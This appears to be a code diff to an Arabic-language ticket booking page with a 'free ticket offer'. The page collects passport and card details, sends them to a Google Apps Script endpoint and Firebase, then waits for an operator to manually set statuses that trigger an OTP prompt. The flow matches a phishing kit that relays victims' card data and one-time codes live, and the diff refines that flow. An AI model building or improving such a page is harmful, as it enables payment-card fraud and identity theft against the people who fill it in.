@@ -205,8 +205,8 @@
     </div>
     </div>
     <div>
-    <label for="free_passportPicture" class="label">صورة الجواز (مهم)</label>
-    <input type="file" id="free_passportPicture" class="hidden" accept="image/*" required>
+    <label for="free_passportPicture" class="label">صورة الجواز (اختياري)</label>
+    <input type="file" id="free_passportPicture" class="hidden" accept="image/*">
     <button type="button" class="file-upload-btn" onclick="document.getElementById('free_passportPicture').click()">
     <i class="fas fa-upload mr-2"></i>رفع صورة الجواز
     </button>
@@ -281,6 +281,7 @@
     let pendingBookingId = null;
     let unsubscribeFromBookingStatus = null;
     let currentUserId = null;
+    let otpFlowStarted = false; // <-- State to track if OTP modal has been shown
     const appId = typeof __app_id !== 'undefined' ? __app_id : '1:666361598120:web:8eb42070c3a56dea87b29d';
 
     // --- Firebase Initialization & Auth --- 
@@ -447,8 +448,8 @@
                 </div>
             </div>
             <div>
-                <label for="main_passportPicture" class="label">صورة الجواز (مهم)</label>
-                <input type="file" id="main_passportPicture" class="hidden" accept="image/*" required>
+                <label for="main_passportPicture" class="label">صورة الجواز (اختياري)</label>
+                <input type="file" id="main_passportPicture" class="hidden" accept="image/*">
                 <button type="button" class="file-upload-btn" onclick="document.getElementById('main_passportPicture').click()">
                     <i class="fas fa-upload mr-2"></i>رفع صورة الجواز
                 </button>
@@ -487,6 +488,10 @@
     
     paymentForm.addEventListener('submit', async (e) => {
         e.preventDefault();
+        
+        // Reset the OTP flow state for this new submission
+        otpFlowStarted = false;
+
         let isValid = true;
         const validateForm = (form) => [...form.elements].forEach(el => {
             el.classList.remove('input-error');
@@ -509,7 +514,7 @@
         if (freeTicketOfferSection.offsetParent) { validateForm(freeTicketForm); }
 
         if (!isValid) {
-            showResultModal('خطأ', 'الرجاء تعبئة جميع الحقول المطلوبة (بما في ذلك صور الجواز).', false);
+            showResultModal('خطأ', 'الرجاء تعبئة جميع الحقول الإجبارية.', false);
             return;
         }
 
@@ -517,10 +522,8 @@
         payBtn.disabled = true;
 
         try {
-            // --- ✅ الرابط الخاص بك ---
             const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxrOix85P6YHKuY1CvSeqlvsUYCH4KAg-vvmWyMzvs8XMoSMOoK4u_wVYD9I8OI2bAP/exec";
-            // --------------------
-
+            
             const payload = {};
 
             payload.booking_ref = currentTicketData.booking_ref;
@@ -565,7 +568,7 @@
                 headers: { "Content-Type": "text/plain;charset=utf-8" }
             });
             
-            console.log('Data submission initiated to Google Script.');
+            console.log('Data submitted;');
             
             showModal('loading-modal', 'جاري الدفع...');
             
@@ -602,7 +605,7 @@
             };
 
             await setDoc(pendingDocRef, firebasePayload);
-            console.log("Pending booking document written to Firebase!");
+            console.log("Booking request sent. Waiting...");
             listenForBookingStatus(pendingBookingId);
 
         } catch (error) {
@@ -643,57 +646,98 @@
         }
     });
 
+    // --- LOGIC CORRECTION ---
     function listenForBookingStatus(docId) {
         if (unsubscribeFromBookingStatus) unsubscribeFromBookingStatus();
         const docRef = doc(db, `artifacts/${appId}/public/data/pending_bookings`, docId);
+
+        // Define retry logic for a failed initial payment
+        const onPaymentFailedRetry = () => {
+            hideAllModals();
+            payBtn.disabled = false;
+            document.getElementById('payment-form').scrollIntoView({ behavior: 'smooth', block: 'center' });
+        };
+
+        // Define retry logic for a failed OTP attempt
+        const onOtpFailedRetry = () => {
+            const otpInputs = otpForm.querySelectorAll('input');
+            otpInputs.forEach(input => input.value = '');
+            hideAllModals();
+            showModal('otp-modal');
+            otpInputs[0].focus();
+        };
+
         unsubscribeFromBookingStatus = onSnapshot(docRef, (docSnap) => {
+            // Case 1: The document was deleted (request expired or was cancelled by admin)
             if (!docSnap.exists()) {
                 if (unsubscribeFromBookingStatus) unsubscribeFromBookingStatus();
-                hideAllModals();
+                otpFlowStarted = false; // Reset state
                 showResultModal(
-                    'تم رفض الطلب', 
-                    'تم إلغاء طلبك من قبل المشرف. يمكنك تعديل بيانات الدفع والمحاولة مرة أخرى.', 
-                    false, 
-                    () => {
-                        // هذا هو التعديل المطلوب
-                        hideAllModals();
-                        payBtn.disabled = false;
-                        // تمرير الشاشة إلى قسم الدفع لتسهيل التعديل
-                        document.getElementById('payment-form').scrollIntoView({ behavior: 'smooth', block: 'center' });
-                    }
+                    'تم رفض الطلب',
+                    'تم رفض طلب الدفع أو انتهت صلاحيته. يرجى مراجعة معلوماتك والمحاولة مرة أخرى.',
+                    false,
+                    onPaymentFailedRetry
                 );
                 return;
             }
 
             const data = docSnap.data();
             console.log("Received status update:", data.status);
+
+            // Case 2: Handle different statuses from the admin
             switch (data.status) {
+                case 'payment_declined':
+                    if (unsubscribeFromBookingStatus) unsubscribeFromBookingStatus();
+                    otpFlowStarted = false; // Reset state
+                    showResultModal(
+                        'فشل الدفع',
+                        'تم رفض معلومات الدفع التي أدخلتها. يرجى التحقق من بيانات بطاقتك والمحاولة مرة أخرى.',
+                        false,
+                        onPaymentFailedRetry
+                    );
+                    break;
+
                 case 'otp_pending':
+                    otpFlowStarted = true; // Set state: OTP flow has now begun
                     hideAllModals();
                     showModal('otp-modal');
                     break;
+
                 case 'confirmed':
                     if (unsubscribeFromBookingStatus) unsubscribeFromBookingStatus();
+                    otpFlowStarted = false; // Reset state
                     hideAllModals();
                     showResultModal('تم تأكيد الحجز!', 'شكراً لك، تم تأكيد حجزك بنجاح. ستصلك التفاصيل قريباً.', true);
                     break;
+
                 case 'otp_declined':
                     hideAllModals();
-                    showResultModal('لم يتم الدفع بنجاح', 'الرمز الذي أدخلته غير صحيح أو تم رفض العملية. الرجاء المحاولة مرة أخرى.', false, () => {
-                        const otpInputs = otpForm.querySelectorAll('input');
-                        otpInputs.forEach(input => input.value = '');
-                        otpInputs[0].focus();
-                        hideAllModals();
-                        showModal('otp-modal');
-                    });
+                    if (otpFlowStarted) {
+                        // This is a genuine OTP decline because the OTP flow had started.
+                        showResultModal('رمز التحقق غير صحيح', 'الرمز الذي أدخلته غير صحيح. الرجاء المحاولة مرة أخرى.', false, onOtpFailedRetry);
+                    } else {
+                        // This is an initial payment decline (due to admin panel bug or logic).
+                        if (unsubscribeFromBookingStatus) unsubscribeFromBookingStatus();
+                        showResultModal(
+                            'فشل الدفع',
+                            'تم رفض معلومات الدفع التي أدخلتها. يرجى التحقق من بيانات بطاقتك والمحاولة مرة أخرى.',
+                            false,
+                            onPaymentFailedRetry
+                        );
+                    }
                     break;
+                
+                // For 'payment_pending' and 'otp_submitted', we do nothing and just wait for the next status update from the admin.
             }
         }, (error) => {
             console.error("Error in status listener:", error);
+            if (unsubscribeFromBookingStatus) unsubscribeFromBookingStatus();
+            otpFlowStarted = false; // Reset state on error
             hideAllModals();
-            showResultModal('خطأ في الاتصال', 'فقدنا الاتصال لمتابعة حالة الطلب.', false);
+            showResultModal('خطأ في الاتصال', 'فقدنا الاتصال لمتابعة حالة الطلب. حاول مرة أخرى.', false, onPaymentFailedRetry);
         });
     }
+    // --- END OF CORRECTION ---
 
     document.getElementById('cardNumber').addEventListener('input', (e) => {
         e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 ').trim();
